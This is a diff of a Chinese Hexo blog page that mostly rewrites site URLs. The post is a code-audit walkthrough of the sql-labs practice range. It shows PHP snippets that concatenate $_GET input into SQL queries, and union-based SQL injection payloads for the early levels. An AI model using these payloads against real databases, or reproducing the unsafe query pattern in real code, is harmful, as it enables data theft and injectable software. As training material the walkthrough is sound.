@@ -5,79 +5,79 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 6.0.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/wan1/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/wan1/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/wan1/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/wan1/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/wan1/css/main.css">
+<link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/wan1/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"wanheiqiyihu.gitee.io","root":"/wan1/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+    var CONFIG = {"hostname":"wanheiqiyihu.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
   <meta name="description" content="PHP审计练习-sql-labs这次笔者通过代码审计的方式来通关这个sql经典靶场 less1很简单的一个,直接拼上去的字符注入 12$id&#x3D;$_GET[&amp;#x27;id&amp;#x27;];$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&amp;#x27;$id&amp;#x27; LIMIT 0,1&quot;;  payload1&#39; and 1&#x3D;2 union selec">
 <meta property="og:type" content="article">
 <meta property="og:title" content="PHP审计练习-sql-labs">
-<meta property="og:url" content="https://wanheiqiyihu.gitee.io/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/index.html">
+<meta property="og:url" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/index.html">
 <meta property="og:site_name" content="十三の博客">
 <meta property="og:description" content="PHP审计练习-sql-labs这次笔者通过代码审计的方式来通关这个sql经典靶场 less1很简单的一个,直接拼上去的字符注入 12$id&#x3D;$_GET[&amp;#x27;id&amp;#x27;];$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&amp;#x27;$id&amp;#x27; LIMIT 0,1&quot;;  payload1&#39; and 1&#x3D;2 union selec">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906193405777.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906193631903.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906194955582.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906195916896.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906195924510.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906200049406.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907123403037.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907123825007.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907125936343.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907130550018.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907132748740.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907132919741.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907133135237.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907133338525.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907150720242.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907152538501.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907152850658.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907153949462.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907155042842.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907155623937.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907161043069.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907175040985.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907180600089.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907183733394.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907185853625.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907191009511.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907193936122.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907194710480.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907195432350.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907200928572.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907201305999.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907201624561.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907205356414.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907210018082.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907210359235.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907210818029.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908102836598.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908103120248.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908103750327.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908111630245.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908112508666.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908113600319.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908114412114.png">
-<meta property="og:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908114513361.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906193405777.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906193631903.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906194955582.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906195916896.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906195924510.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906200049406.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907123403037.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907123825007.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907125936343.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907130550018.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907132748740.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907132919741.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907133135237.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907133338525.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907150720242.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907152538501.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907152850658.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907153949462.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907155042842.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907155623937.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907161043069.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907175040985.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907180600089.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907183733394.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907185853625.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907191009511.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907193936122.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907194710480.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907195432350.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907200928572.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907201305999.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907201624561.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907205356414.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907210018082.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907210359235.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220907210818029.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908102836598.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908103120248.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908103750327.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908111630245.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908112508666.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908113600319.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908114412114.png">
+<meta property="og:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220908114513361.png">
 <meta property="article:published_time" content="2022-09-08T03:50:29.000Z">
 <meta property="article:modified_time" content="2022-09-11T07:15:36.000Z">
 <meta property="article:author" content="十三">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://wanheiqiyihu.gitee.io/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906193405777.png">
+<meta name="twitter:image" content="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906193405777.png">
 
-<link rel="canonical" href="https://wanheiqiyihu.gitee.io/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/">
+<link rel="canonical" href="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/">
 
 
 <script id="page-configurations">
@@ -139,7 +139,7 @@
 
   <div class="site-meta">
 
-    <a href="/wan1/" class="brand" rel="start">
+    <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
       <h1 class="site-title">十三の博客</h1>
       <span class="logo-line-after"><i></i></span>
@@ -160,92 +160,92 @@
   <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
 
-    <a href="/wan1/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/wan1/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
         <li class="menu-item menu-item-ctf做题笔记">
 
-    <a href="/wan1/categories/Experience" rel="section"><i class="download fa-fw"></i>CTF做题笔记</a>
+    <a href="/categories/Experience" rel="section"><i class="download fa-fw"></i>CTF做题笔记</a>
 
   </li>
         <li class="menu-item menu-item-python">
 
-    <a href="/wan1/categories/python" rel="section"><i class="download fa-fw"></i>python</a>
+    <a href="/categories/python" rel="section"><i class="download fa-fw"></i>python</a>
 
   </li>
         <li class="menu-item menu-item-java">
 
-    <a href="/wan1/categories/java" rel="section"><i class="download fa-fw"></i>java</a>
+    <a href="/categories/java" rel="section"><i class="download fa-fw"></i>java</a>
 
   </li>
         <li class="menu-item menu-item-读书笔记">
 
-    <a href="/wan1/categories/readbook" rel="section"><i class="download fa-fw"></i>读书笔记</a>
+    <a href="/categories/readbook" rel="section"><i class="download fa-fw"></i>读书笔记</a>
 
   </li>
         <li class="menu-item menu-item-渗透测试">
 
-    <a href="/wan1/categories/penetration" rel="section"><i class="download fa-fw"></i>渗透测试</a>
+    <a href="/categories/penetration" rel="section"><i class="download fa-fw"></i>渗透测试</a>
 
   </li>
         <li class="menu-item menu-item-基础">
 
-    <a href="/wan1/categories/basic" rel="section"><i class="download fa-fw"></i>基础</a>
+    <a href="/categories/basic" rel="section"><i class="download fa-fw"></i>基础</a>
 
   </li>
         <li class="menu-item menu-item-轮子">
 
-    <a href="/wan1/categories/lunzi" rel="section"><i class="download fa-fw"></i>轮子</a>
+    <a href="/categories/lunzi" rel="section"><i class="download fa-fw"></i>轮子</a>
 
   </li>
         <li class="menu-item menu-item-漏洞库">
 
-    <a href="/wan1/categories/fuxian" rel="section"><i class="download fa-fw"></i>漏洞库</a>
+    <a href="/categories/fuxian" rel="section"><i class="download fa-fw"></i>漏洞库</a>
 
   </li>
         <li class="menu-item menu-item-工具">
 
-    <a href="/wan1/categories/tools" rel="section"><i class="download fa-fw"></i>工具</a>
+    <a href="/categories/tools" rel="section"><i class="download fa-fw"></i>工具</a>
 
   </li>
         <li class="menu-item menu-item-代码审计">
 
-    <a href="/wan1/categories/daima" rel="section"><i class="download fa-fw"></i>代码审计</a>
+    <a href="/categories/daima" rel="section"><i class="download fa-fw"></i>代码审计</a>
 
   </li>
         <li class="menu-item menu-item-逆向">
 
-    <a href="/wan1/categories/nixiang" rel="section"><i class="download fa-fw"></i>逆向</a>
+    <a href="/categories/nixiang" rel="section"><i class="download fa-fw"></i>逆向</a>
 
   </li>
         <li class="menu-item menu-item-应急响应">
 
-    <a href="/wan1/categories/yingji" rel="section"><i class="download fa-fw"></i>应急响应</a>
+    <a href="/categories/yingji" rel="section"><i class="download fa-fw"></i>应急响应</a>
 
   </li>
         <li class="menu-item menu-item-免杀">
 
-    <a href="/wan1/categories/miansha" rel="section"><i class="download fa-fw"></i>免杀</a>
+    <a href="/categories/miansha" rel="section"><i class="download fa-fw"></i>免杀</a>
 
   </li>
         <li class="menu-item menu-item-靶场">
 
-    <a href="/wan1/categories/bachang" rel="section"><i class="download fa-fw"></i>靶场</a>
+    <a href="/categories/bachang" rel="section"><i class="download fa-fw"></i>靶场</a>
 
   </li>
         <li class="menu-item menu-item-cve申请">
 
-    <a href="/wan1/categories/cve" rel="section"><i class="download fa-fw"></i>cve申请</a>
+    <a href="/categories/cve" rel="section"><i class="download fa-fw"></i>cve申请</a>
 
   </li>
         <li class="menu-item menu-item-c语言">
 
-    <a href="/wan1/categories/c" rel="section"><i class="download fa-fw"></i>c语言</a>
+    <a href="/categories/c" rel="section"><i class="download fa-fw"></i>c语言</a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -303,10 +303,10 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.gitee.io/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/wan1/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="十三">
       <meta itemprop="description" content="潜心学习，不骄不躁">
     </span>
@@ -341,7 +341,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/wan1/categories/daima/" itemprop="url" rel="index"><span itemprop="name">-daima</span></a>
+                  <a href="/categories/daima/" itemprop="url" rel="index"><span itemprop="name">-daima</span></a>
                 </span>
             </span>
 
@@ -365,17 +365,17 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <p>数字注入不需要闭合单引号，所以直接payload<code>1 and 1=2 union select 1,database(),2--+</code></p>
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906193405777.png" alt="image-20220906193405777"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906193405777.png" alt="image-20220906193405777"></p>
 <h1 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h1><p>就是加了个括号,闭合一下</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
 
 <p>payload<code>id=1&#39;) and 1=2 union select 1,database(),user()--+</code></p>
-<p><img src="/wan1/wan1/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906193631903.png" alt="image-20220906193631903"></p>
+<p><img src="/2022/09/08/PHP%E5%AE%A1%E8%AE%A1%E7%BB%83%E4%B9%A0-sql-labs/image-20220906193631903.png" alt="image-20220906193631903"></p>
 <h1 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h1><p>加了个双引号，又加个括号，闭合一下。</p>
